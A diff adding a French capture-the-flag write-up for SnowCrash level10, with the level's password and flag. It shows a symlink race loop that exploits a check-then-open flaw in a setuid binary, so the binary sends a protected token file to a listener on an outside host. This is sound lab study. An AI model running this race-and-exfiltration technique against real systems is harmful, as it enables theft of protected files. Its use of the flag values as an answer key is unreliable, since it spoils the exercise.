@@ -1,3 +1,24 @@
 Temporary : 
   - Password : woupa2yuojeeaaed06riuj63c
   - Flag : feulo4b72j7edeahuete3no7c
+
+Explication : 
+
+On execute level10, il nous demande un token et un host :
+
+level10@SnowCrash:~$ ./level10 token localhost
+You don't have access to token
+
+On va executer le server.py sur notre pc puis tester avec un autre fichier.
+
+echo "test" > /tmp/test 
+
+level10@SnowCrash:~$ ./level10 /tmp/test 10.171.56.245
+Connecting to 10.171.56.245:6969 .. Connected!
+Sending file .. wrote file!
+
+Pour le fichier token, ce n'est pas check avec le nom mais bien avec les permissions, mais lorsqu'on regarde, le check des permissions est fait bien avant l'open.
+
+Donc on va pouvoir utiliser cette vulnerabilite pour changer le fichier en boucle puis spam le send.
+
+$(while true; do ln -sf /tmp/test /tmp/faketoken; ln -sf $(pwd)/token /tmp/faketoken; done)&
